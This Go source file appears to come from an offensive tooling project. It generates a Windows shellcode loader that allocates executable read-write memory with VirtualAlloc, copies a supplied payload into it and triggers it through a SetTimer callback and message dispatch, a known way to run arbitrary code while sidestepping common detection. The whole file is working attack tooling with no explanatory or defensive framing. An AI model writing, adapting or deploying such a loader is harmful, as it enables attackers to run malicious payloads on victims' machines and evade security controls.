package loaders

import (
	"fmt"
	"strings"
)

type SetTimerTemplate struct {
}

func (t SetTimerTemplate) Import() string {
	return fmt.Sprintf(`
import (
    "syscall"
    "unsafe"
)
`)
}

func (t SetTimerTemplate) Const() string {
	return fmt.Sprintf(`
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	user32        = syscall.MustLoadDLL("user32.dll")

	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	SetTimer      = user32.MustFindProc("SetTimer")
	GetMessageW   = user32.MustFindProc("GetMessageW")
	DispatchMessageW = user32.MustFindProc("DispatchMessageW")
)
`)
}

func (t SetTimerTemplate) Init() string {
	return ""
}

func (t SetTimerTemplate) Process() string {
	return fmt.Sprintf(`
	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	for i := 0; i < len(shellcode); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
	}

	var dummy uintptr = 0
	_, _, _ = SetTimer.Call(0, dummy, 0, addr)

	var msg [48]byte
	_, _, _ = GetMessageW.Call(uintptr(unsafe.Pointer(&msg[0])), 0, 0, 0)
	_, _, _ = DispatchMessageW.Call(uintptr(unsafe.Pointer(&msg[0])))
`)
}

func (t SetTimerTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__PROCESS__
	
}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template
}
